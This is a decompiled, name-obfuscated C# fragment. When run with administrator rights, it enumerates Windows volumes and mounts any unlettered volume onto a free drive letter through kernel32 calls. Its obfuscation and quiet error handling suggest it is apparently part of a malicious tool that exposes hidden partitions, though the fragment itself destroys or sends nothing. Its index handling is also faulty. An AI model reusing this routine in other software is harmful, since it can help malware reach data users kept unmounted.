using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace PbjBzLsVOvNrzQ;

public static class xKXUupjLWjcixc
{
	public enum xuAupPgaDjr : uint
	{
		nfwOoDLfdtoB,
		zHlOcpxoQmHx,
		PfGPOYycee,
		LVObeleaAzxYpr,
		DllrnuvUauPHR,
		XYIXuRLeQgukkZx,
		WSMZLhdztyvgV
	}

	[CompilerGenerated]
	private sealed class CWilYstvrK
	{
		public uint CQCkRNzFvn;

		public uint NGgdLddGTmYi;

		public char[] DPKbhwUsHcy;

		public bool _003CMountVolumes_003Eb__0(string volumeName)
		{
			if (GetVolumePathNamesForVolumeNameW(volumeName, DPKbhwUsHcy, NGgdLddGTmYi, ref CQCkRNzFvn))
			{
				return DPKbhwUsHcy.Length != 3;
			}
			return true;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern xuAupPgaDjr GetDriveType([MarshalAs(UnmanagedType.LPStr)] string ELSteWhLqwMTqlA);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string qUvlNHUoeCdT, char[] GIoUIFxpfQxFvOF, uint bVKOkXFzaNH, ref uint twBoHjJLSiUd);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string OFkxrHdVTEXMcRQ, string OKmgGJntTGRVwv);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder ccxXShtvzLnUy, int wKscYOPnvNqX);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int qauKccNzqgOee, StringBuilder jHNgRdTFfyyw, int BMXmvMiXPofCnQPM);

	public static List<string> PGuaZbpJNQjdt()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int qauKccNzqgOee = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(qauKccNzqgOee, stringBuilder, 1024));
		return list;
	}

	public static void CtWXcziwRuADRa()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			string[] array = new string[26]
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "C:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == xuAupPgaDjr.zHlOcpxoQmHx)
				{
					array2[num++] = text;
				}
			}
			List<string> source = PGuaZbpJNQjdt();
			uint CQCkRNzFvn = 0u;
			uint NGgdLddGTmYi = 120u;
			char[] DPKbhwUsHcy = new char[260];
			foreach (string item in source.Where((string volumeName) => !GetVolumePathNamesForVolumeNameW(volumeName, DPKbhwUsHcy, NGgdLddGTmYi, ref CQCkRNzFvn) || DPKbhwUsHcy.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (oIxRFVSIpmRuMqIJ.QPmKNZZswIrG)
				{
					try
					{
						Console.WriteLine("Drive Mounted: {0}", array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (oIxRFVSIpmRuMqIJ.TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(oIxRFVSIpmRuMqIJ.lNABZjYJLaAdehz, "Error while mounting network drives: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
